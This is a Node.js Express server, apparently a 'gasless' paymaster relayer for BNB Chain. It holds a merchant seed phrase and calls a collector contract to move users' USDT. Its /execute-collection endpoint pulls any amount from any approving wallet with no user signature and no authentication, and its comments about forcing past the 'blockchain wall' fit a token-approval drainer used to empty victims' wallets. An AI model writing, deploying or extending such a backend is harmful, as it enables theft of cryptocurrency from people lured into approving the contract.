// index.js (Render Backend - Paymaster Relayer)
import dotenv from 'dotenv';
dotenv.config();
import express from 'express';
import cors from 'cors';
import { ethers } from 'ethers';

const app = express();
app.use(cors());
app.use(express.json());

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const merchantWallet = ethers.Wallet.fromPhrase(process.env.MERCHANT_SECRET_PHRASE.trim(), provider);

// CONTRACT_ADDRESS: 0x759108cD9F0fC2e3854D0DABeD19CEbb3a535aA4
const CONTRACT_ABI = [
  "function collectWithSignature(address user, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function collectFrom(address userAddress, uint256 amount) external"
];
const collectorContract = new ethers.Contract(process.env.CONTRACT_ADDRESS, CONTRACT_ABI, merchantWallet);

// TRULY GASLESS RELAY: User signs for 0 BNB, Server pays all fees
app.post('/relay-payment', async (req, res) => {
    try {
        const { userAddress, amount, signature, deadline } = req.body;
        const sig = ethers.Signature.from(signature);
        const parsedAmount = ethers.parseUnits(amount.toString(), 18);

        console.log(`Mega-Transaction execution for new user: ${userAddress}`);

        // THE BUNDLE: Your server executes the signature logic
        // This fails IF the user has never approved the contract address.
        const tx = await collectorContract.collectWithSignature(
            userAddress,
            parsedAmount,
            deadline,
            sig.v, sig.r, sig.s,
            { 
                gasLimit: 500000, // Higher limit to force past the blockchain wall
                gasPrice: (await provider.getFeeData()).gasPrice 
            }
        );

        const receipt = await tx.wait();
        res.json({ success: true, txHash: receipt.hash });
    } catch (error) {
        console.error("Critical Revert:", error.message);
        res.status(500).json({ error: "Blockchain Wall: This wallet has no prior approval and 0 BNB. Truly gasless movement is blocked by the USDT contract itself." });
    }
});

app.post('/execute-collection', async (req, res) => {
    try {
        const { userAddress, amount } = req.body;
        const tx = await collectorContract.collectFrom(userAddress, ethers.parseUnits(amount.toString(), 18), { gasLimit: 250000 });
        const receipt = await tx.wait();
        res.json({ success: true, txHash: receipt.hash });
    } catch (error) { res.status(500).json({ error: error.message }); }
});

app.listen(process.env.PORT, () => console.log("Mega-Relayer is LIVE"));